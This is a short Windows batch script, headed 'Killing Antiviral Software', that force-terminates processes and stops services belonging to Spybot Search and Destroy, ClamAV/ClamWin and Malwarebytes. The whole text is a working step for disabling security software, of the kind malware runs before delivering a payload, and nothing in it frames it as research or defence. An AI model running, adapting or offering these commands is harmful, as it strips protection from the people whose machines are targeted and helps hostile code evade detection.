ECHO Killing Antiviral Software

ECHO ...SaferNetworking SpyBot Search and Destroy
taskkill /f /im SDTray.exe
taskkill /f /im teatimer.exe
taskkill /f /im spybotsd2-SDLicense-websitev3.exe
net stop SDScannerService
net stop SDWSCService
net stop SDUpdateService

ECHO ...ClamAV/Windows
taskkill /f /im clamtray.exe
taskkill /f /im clamav.exe
taskkill /f /im clamwin.exe


ECHO ...MalwareBytes
net stop MBAMService
taskkill /f /im mbam.exe
taskkill /f /im mbamtray.exe